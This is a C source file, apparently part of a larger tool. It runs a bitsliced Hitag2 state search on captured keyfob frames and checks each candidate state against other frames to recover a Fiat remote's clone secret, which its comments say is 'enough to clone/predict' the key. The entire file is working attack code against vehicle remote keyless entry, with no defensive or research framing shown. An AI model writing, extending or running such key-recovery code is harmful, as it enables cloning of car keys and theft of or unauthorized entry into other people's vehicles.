// Full Fiat/Hitag2 recovery: run the hitag2hell bitslice on frame0's hop, and for every
// recovered post-init state apply the Fiat bridge (fb_check_state) against the other frames.
// On a match this yields the clone secret {k4,k5,clone[31..0]} — enough to clone/predict.
// Exposes the same symbols native_solver.c already calls (replaces the old buggy fiat_recover.c).
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include "fiat_bridge.h"
#include "h2bitslice.h"

typedef struct {
    uint32_t uid;
    int n;
    const int *btn, *ctrl;
    const uint32_t *hop;
    uint8_t out[6];
    int ok;
} fr_check;

static int fr_check_cb(void *user, uint64_t state48) {
    fr_check *c = (fr_check *)user;
    uint8_t out[6];
    if (fb_check_state(c->uid, state48, c->n, c->btn, c->ctrl, c->hop, out)) {
        memcpy(c->out, out, 6);
        c->ok = 1;
        return 1;
    }
    return 0;
}

static volatile int g_cancel = 0;
static unsigned long long g_scanned = 0;
static pthread_mutex_t g_run_lock = PTHREAD_MUTEX_INITIALIZER; // serialize whole runs (globals in h2bitslice are shared)

int fiat_recover(uint32_t uid, int n, const int *btn, const int *ctrl,
                 const uint32_t *hop, int threads, uint8_t out[6]) {
    if (n < 2) return 0;
    if (n > 8) n = 8;
    pthread_mutex_lock(&g_run_lock);
    g_cancel = 0;
    g_scanned = 0;
    fr_check c = { uid, n, btn, ctrl, hop, {0}, 0 };
    h2_ctx_t ctx;
    ctx.user = &c;
    ctx.check = fr_check_cb;
    ctx.cancel = &g_cancel;
    ctx.scanned = &g_scanned;
    ctx.found = 0;
    pthread_mutex_init(&ctx.lock, NULL);
    h2_run(hop[0], threads, &ctx);
    pthread_mutex_destroy(&ctx.lock);
    int ok = c.ok;
    if (ok) memcpy(out, c.out, 6);
    pthread_mutex_unlock(&g_run_lock);
    return ok;
}

unsigned long long fiat_recover_scanned(void) { return g_scanned; }

void fiat_recover_cancel(void) { g_cancel = 1; }
